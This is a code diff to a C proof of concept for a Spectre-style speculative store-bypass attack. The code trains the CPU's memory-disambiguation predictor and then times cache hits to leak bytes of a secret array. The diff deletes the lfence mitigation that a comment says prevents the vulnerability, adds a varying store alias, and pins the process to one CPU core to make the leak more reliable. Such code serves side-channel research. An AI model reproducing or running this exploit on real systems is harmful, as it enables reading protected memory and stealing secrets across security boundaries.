@@ -18,6 +18,8 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 
+#include <sched.h>
+
 /********************************************************************
 Victim code.
 ********************************************************************/
@@ -41,16 +43,11 @@ uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
  * value stored at *store_addr even when store_addr != load_addr. We abuse this
  * to read and leak values of secret[] through *load_addr, despite *load_addr
  * never actually containing these values. */
-void victim_function(size_t x, register volatile int32_t* store_addr, register volatile int32_t* load_addr,  uint64_t  training_alias, uint64_t malicious_alias) {
+void victim_function(size_t x, register volatile int32_t* store_addr, register volatile int32_t* load_addr) {
  // printf("store_addr: %p load_addr: %p    x: %p   malicious pass: %p   \n", store_addr, load_addr, x, mal);
 
   *store_addr = array1[x]+1;
-  // placing an lfence here after the store prevents the vulnerability
-//          alias_p = (int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias)));
-  if (load_addr == store_addr) _mm_lfence();
-
- temp &= array2[(*(load_addr)-1) * 512];
- //  temp &= array2[(*((int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias))))-1) * 512];
+  temp &= array2[(*(load_addr)-1) * 512];
 }
 
 
@@ -77,7 +74,10 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256
     training_x = tries % array1_size;
     uint64_t training_alias = (uint64_t)&store_addrs[dropnum];
     uint64_t malicious_alias = (uint64_t)load_addrs[pagenum];
+    uint64_t training_store = (uint64_t)&store_addrs[dropnum];
+    uint64_t malicious_store = (uint64_t)&store_addrs[dropnum+1];
     int32_t* alias_p;
+    int32_t* alias_q;
     for (int k = 0; k < 500; k++) {
       for (j = 25-1; j >= 0; j--) {
         /* Bit twiddling to set x=training_x if j%25!=0 or malicious_x if j%25==0 */
@@ -87,6 +87,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256
         // set alias_p to truly alias the store_addr if j%25!=0,
         // and NOT alias the store_addr if j%25==0
         alias_p = (int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias)));
+        alias_q = (int32_t*)(training_store ^ (x & (malicious_store ^ training_store)));
         x = training_x ^ (x & (malicious_x ^ training_x));
 
         _mm_clflush( (int32_t*)malicious_alias);
@@ -96,7 +97,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256
         _mm_lfence();
 
         /* Call the victim! */
-        victim_function(x, &store_addrs[dropnum], alias_p, training_alias, malicious_alias);
+        victim_function(x, alias_q, alias_p);
       }
     }
 
@@ -154,6 +155,12 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256
 */
 int main(int argc,
   const char * * argv) {
+
+  /* Set CPU affinity */
+  cpu_set_t cpus;
+  CPU_ZERO(&cpus);
+  CPU_SET(0, &cpus);
+  sched_setaffinity(0, sizeof(cpus), &cpus);
   
   /* Default to a cache hit threshold of 80 */
   int cache_hit_threshold = 80;
